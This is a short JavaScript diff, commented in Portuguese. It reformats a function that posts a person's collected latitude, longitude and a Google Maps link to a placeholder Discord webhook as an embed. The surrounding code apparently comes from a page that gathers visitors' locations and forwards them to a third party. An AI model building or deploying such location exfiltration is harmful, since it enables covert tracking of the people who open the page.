@@ -58,10 +58,33 @@
         // URL do webhook do Discord (substitua pelo seu webhook)
         const discordWebhookURL = 'SUA_URL_DO_WEBHOOK_AQUI';
 
-        // Função para enviar a localização para o Discord
+        // Função para enviar a localização para o Discord em um embed
         const sendLocationToDiscord = async (latitude, longitude) => {
+            const embed = {
+                title: "📍 Nova Localização Recebida",
+                description: "Uma nova localização foi coletada.",
+                color: 0x00ff00, // Cor verde
+                fields: [
+                    {
+                        name: "Latitude",
+                        value: latitude.toString(),
+                        inline: true,
+                    },
+                    {
+                        name: "Longitude",
+                        value: longitude.toString(),
+                        inline: true,
+                    },
+                    {
+                        name: "Ver no Mapa",
+                        value: `[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
+                    },
+                ],
+                timestamp: new Date().toISOString(),
+            };
+
             const message = {
-                content: `Nova localização recebida:\nLatitude: ${latitude}\nLongitude: ${longitude}\n[Ver no Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
+                embeds: [embed],
             };
 
             try {
